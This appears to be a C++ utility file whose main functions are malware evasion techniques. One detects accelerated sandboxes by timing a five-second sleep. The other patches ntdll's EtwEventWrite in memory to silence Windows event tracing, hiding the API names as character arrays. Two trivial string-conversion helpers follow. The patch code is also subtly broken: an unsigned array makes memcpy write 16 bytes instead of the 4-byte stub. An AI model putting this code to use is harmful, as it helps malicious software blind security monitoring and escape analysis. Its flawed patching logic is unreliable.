#include "utils.h"


namespace util {

bool isTimeAccelerated() {
    auto start = std::chrono::steady_clock::now();

    std::this_thread::sleep_for(std::chrono::seconds(5));

    auto end = std::chrono::steady_clock::now();

    auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);

    if (duration.count() < 5000) {
        return true;
    } else {
        return false;
    }
}

BOOL DisableEvent(void) {
    DWORD oldprotect = 0;

    char eventwrite[] = {'E', 't', 'w', 'E', 'v', 'e', 'n', 't', 'W', 'r', 'i', 't', 'e', 0};
    char dll[] = {'n', 't', 'd', 'l', 'l', 0};
    unsigned patch[] = {0x48, 0x33, 0xc0, 0xc3};

    auto *addr1 = GetProcAddress(GetModuleHandleA(dll), eventwrite);
    if (!addr1) {
        return FALSE;
    }

    char *addr = (char *) addr1;

    BOOL status = VirtualProtect(addr, 4096, PAGE_EXECUTE_READWRITE, &oldprotect);
    if (!status) {
        return FALSE;
    }

    memcpy(addr, patch, sizeof(patch));

    BOOL statusvir = VirtualProtect(addr, 4096, oldprotect, &oldprotect);
    if (!statusvir) {
        return FALSE;
    }

    return TRUE;
}


std::string wstringToString(const std::wstring &wstr) {
    std::string str(wstr.begin(), wstr.end());
    return str;
}

std::wstring stringToWstring(const std::string &str) {
    std::wstring wstr(str.begin(), str.end());
    return wstr;
}

}